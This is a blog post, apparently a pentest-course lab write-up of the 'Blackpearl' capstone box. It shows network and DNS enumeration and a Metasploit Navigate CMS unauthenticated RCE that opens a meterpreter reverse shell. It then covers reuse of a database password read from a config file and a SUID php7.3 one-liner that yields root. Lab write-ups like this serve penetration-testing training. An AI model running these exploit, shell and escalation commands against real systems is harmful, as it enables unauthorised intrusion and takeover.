---
layout: post
title: "PJPT Capstone: Blackpearl"
author: Andrew Cherney
date: 2024-01-31 04:59:16
tags: pjpt linux webapp suid 
icon: "assets/icons/pjpt.png"
post_description: "This is a part of the mid-course capstone of the PJPT. Structured more as pentest notes than an actual writeup. Find the hostname and it's an easy webapp challenge ending in a GTFObin."
---

# Summary

{{ page.post_description }}

10.0.69.9

### Findings

22 10.0.69.9 - OpenSSH 7.9p1

53 10.0.69.9 - ISC BIND 9.11.5-P4-5.1+deb10u5
- Hostname Leak - nslookup 127.0.0.1 blackpearl.tcm

<br>
80 10.0.69.9 - nginx 1.14.2

- PHP Version Default Page - PHP
- Insufficient Patching - Navigate CMS v2.8
- Unauthenticated RCE - Navigate CMS v2.8

<br>
localhost 10.0.69.9

- Weak Password - alek
- Reused CMS & User Password - alek
- Insecure SUID Permissions Set - PHP7.3

<br>

# Enum

### Network Scan

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Blackpearl]
└──╼ $nmap -T4 -p- -A 10.0.69.9
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-26 22:03 CST
Nmap scan report for 10.0.69.9
Host is up (0.0011s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### DNS

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Blackpearl]
└──╼ $nslookup
> SERVER 10.0.69.9
Default server: 10.0.69.9
Address: 10.0.69.9#53
> 127.0.0.1
1.0.0.127.in-addr.arpa	name = blackpearl.tcm.
> 10.0.69.9
** server can't find 9.69.0.10.in-addr.arpa: NXDOMAIN
```
### Webapp - 80

```bash
<cross-domain-policy>
<allow-access-from domain="pixlr.com"/>
<site-control permitted-cross-domain-policies="master-only"/>
<allow-http-request-headers-from domain="pixlr.com" headers="*" secure="true"/>
</cross-domain-policy>
```
![](/img/blackpearl/blackpearl_80_dirbuster_scan.png)

/navigate/login.php


![](/img/blackpearl/blackpearl_navigate_cms_login_portal.png)

Navigate CMS
https://www.exploit-db.com/exploits/45561

```bash
[msf](Jobs:0 Agents:0) >> search navigate

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/multi/browser/firefox_svg_plugin     2013-01-08       excellent  No     Firefox 17.0.1 Flash Privileged Code Injection
   1  exploit/windows/misc/hta_server              2016-10-06       manual     No     HTA Web Server
   2  auxiliary/gather/safari_file_url_navigation  2014-01-16       normal     No     Mac OS X Safari file:// Redirection Sandbox Escape
   3  exploit/multi/http/navigate_cms_rce          2018-09-26       excellent  Yes    Navigate CMS Unauthenticated Remote Code Execution


Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/navigate_cms_rce

[msf](Jobs:0 Agents:0) >> use 3
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/http/navigate_cms_rce) >> options

Module options (exploit/multi/http/navigate_cms_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framew
                                         ork/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /navigate/       yes       Base Navigate CMS directory path
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.2.69     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


[msf](Jobs:0 Agents:0) exploit(multi/http/navigate_cms_rce) >> set RHOST 10.0.69.9
RHOST => 10.0.69.9
[msf](Jobs:0 Agents:0) exploit(multi/http/navigate_cms_rce) >> check
[*] 10.0.69.9:80 - The target is not exploitable.
[msf](Jobs:0 Agents:0) exploit(multi/http/navigate_cms_rce) >> set RHOST blackpearl.tcm
RHOST => blackpearl.tcm
[msf](Jobs:0 Agents:0) exploit(multi/http/navigate_cms_rce) >> check
[+] 10.0.69.9:80 - The target is vulnerable.
[msf](Jobs:0 Agents:0) exploit(multi/http/navigate_cms_rce) >> run

[*] Started reverse TCP handler on 192.168.2.69:4444 
[+] Login bypass successful
[+] Upload successful
[*] Triggering payload...
[*] Sending stage (39927 bytes) to 192.168.2.50
[*] Meterpreter session 1 opened (192.168.2.69:4444 -> 192.168.2.50:48217) at 2024-01-26 22:28:49 -0600

(Meterpreter 1)(/var/www/blackpearl.tcm/navigate) > shell
Process 1292 created.
Channel 1 created.
whoami
www-data
```

# www-data

```bash
pwd
/var/www/blackpearl.tcm/navigate
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@blackpearl:~/blackpearl.tcm/navigate$ ls
ls
LICENSE.txt  crossdomain.xml  index.php  navigate.php		plugins  web
README	     css	      js	 navigate_download.php	private
cache	     favicon.ico      lib	 navigate_info.php	themes
cfg	     img	      login.php  navigate_upload.php	updates
www-data@blackpearl:~/blackpearl.tcm/navigate$ cat login.php
cat login.php
<?php
require_once('cfg/globals.php');
require_once('cfg/common.php');
```

```bash
www-data@blackpearl:~/blackpearl.tcm/navigate$ cat cfg/globals.php
cat cfg/globals.php
<?php
/* NAVIGATE */
/* Globals configuration file */

/* App installation details */
define('APP_NAME', 'Navigate CMS');
define('APP_VERSION', '2.8 r1302');
define('APP_OWNER', "blackpearl");
define('APP_REALM', "NaviWebs-NaviGate"); // used for password encryption, do not change!
define('APP_UNIQUE', "nv_d1b59e348060b3d5b17fff89.68796804"); // unique id for this installation
define('APP_DEBUG', false || isset($_REQUEST['debug']));
define('APP_FAILSAFE', false);

/* App installation paths */
define('NAVIGATE_PARENT', '//blackpearl.tcm');	// absolute URL to folder which contains the navigate folder (protocol agnostic and without final slash) [example: '//www.domain.com']
define('NAVIGATE_FOLDER', "/navigate"); // name of the navigate folder (default: /navigate)
define('NAVIGATE_PATH', "/var/www/blackpearl.tcm/navigate"); // absolute system path to navigate folder

define('NAVIGATE_PRIVATE', "/var/www/blackpearl.tcm/navigate/private");
define('NAVIGATE_MAIN', "navigate.php");
define('NAVIGATE_DOWNLOAD', NAVIGATE_PARENT.NAVIGATE_FOLDER.'/navigate_download.php');

define('NAVIGATECMS_STATS', false);
define('NAVIGATECMS_UPDATES', false);

/* Optional Utility Paths */
define('JAVA_RUNTIME', '"{JAVA_RUNTIME}"');

/* Database connection */
define('PDO_HOSTNAME', "localhost");
define('PDO_PORT',     "3306");
define('PDO_SOCKET',   "");
define('PDO_DATABASE', "navigate");
define('PDO_USERNAME', "alek");
define('PDO_PASSWORD', "H4x0r");
define('PDO_DRIVER',   "mysql");

ini_set('magic_quotes_runtime', false);
mb_internal_encoding("UTF-8");	/* Set internal character encoding to UTF-8 */

ini_set('display_errors', false);
if(APP_DEBUG)
{
    ini_set('display_errors', true);
    ini_set('display_startup_errors', true);   
www-data@blackpearl:~/blackpearl.tcm/navigate$ su alek
su alek
Password: H4x0r

alek@blackpearl:/var/www/blackpearl.tcm/navigate$ 
```

# alek

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Blackpearl]
└──╼ $ssh alek@blackpearl.tcm
The authenticity of host 'blackpearl.tcm (10.0.69.9)' can't be established.
ECDSA key fingerprint is SHA256:aWG0gs4+8lxwL4Vnvg8b+SsE9SZt8Kx0poBAUZHs+8Y.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'blackpearl.tcm,10.0.69.9' (ECDSA) to the list of known hosts.
alek@blackpearl.tcm's password: 
Linux blackpearl 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
alek@blackpearl:~$ find / -perm /4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/php7.3
/usr/bin/su
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
alek@blackpearl:~$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
# whoami
root
# cat /root/*		
Good job on this one.
Finding the domain name may have been a little guessy,
but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF.
# 
```


